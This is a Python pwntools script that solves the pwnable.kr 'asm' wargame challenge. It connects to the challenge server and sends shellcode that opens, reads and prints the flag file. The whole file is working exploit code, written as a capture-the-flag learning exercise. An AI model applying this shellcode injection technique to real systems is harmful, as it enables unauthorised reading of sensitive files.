#!/usr/bin/env python3
from pwn import *

"""
Apparently, the stub is code is:
    xor    rax,rax
    xor    rbx,rbx
    xor    rcx,rcx
    xor    rdx,rdx
    xor    rsi,rsi
    xor    rdi,rdi
    xor    rbp,rbp
    xor    r8,r8
    xor    r9,r9
    xor    r10,r10
    xor    r11,r11
    xor    r12,r12
    xor    r13,r13
    xor    r14,r14
    xor    r15,r15
    nop

I examined that first, which just showed that it clears the registers
such that one cannot cheat.

Thus, we just need to open, read and write the contents of the flag file
"""

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./asm')

context.terminal = ["tmux", "splitw", "-h"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start():
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    elif args.LOCAL:
        return process([exe.path])
    else:
        return remote('pwnable.kr', 9026)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# Just before calling supplied shellcode
break *(main+0x143)

continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

flag_filename = 'this_is_pwnable.kr_flag_file_please_read_' \
                'this_file.sorry_the_file_name_is_very_looo' \
                'oooooooooooooooooooooooooooooooooooooooooo' \
                'ooooooooooooooooooooooooooooooo00000000000' \
                '00000000000000ooooooooooooooooooooooo00000' \
                '0000000o0o0o0o0o0o0ong'
if args.LOCAL or args.GDB:
    flag_filename = __file__  # read this file instead

io = start()

shellcode = asm(
        shellcraft.open(flag_filename) +
        shellcraft.read('rax', 'rsp', 0x1000) +
        shellcraft.write(1, 'rsp', 'rax')
    )

io.recvuntil('give me your x64 shellcode: ')
io.send(shellcode)
success(io.recvall().decode('utf8'))
